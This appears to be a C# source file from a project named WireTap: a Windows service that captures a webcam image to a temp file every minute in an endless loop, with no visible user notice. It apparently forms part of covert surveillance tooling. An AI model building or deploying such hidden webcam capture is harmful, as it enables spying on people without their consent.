namespace WireTap.WindowsService
{
    using System;
    using System.Collections.Generic;
    using System.ComponentModel;
    using System.Data;
    using System.Diagnostics;
    using System.Linq;
    using System.ServiceProcess;
    using System.Text;
    using System.Threading.Tasks;

    partial class WebCameraService : ServiceBase
    {
        public WebCameraService()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            Console.WriteLine("Inside captureWebCam");

            while (true)
            {
                string tempFile = Helpers.CreateTempFileName(".jpeg", "webcam-");
                WebCam.CaptureImage(tempFile);
                Task.Run(() => Task.Delay(TimeSpan.FromMinutes(1))).Wait();
            }
        }

        protected override void OnStop()
        {
            // TODO: Add code here to perform any tear-down necessary to stop your service.
        }
    }
}
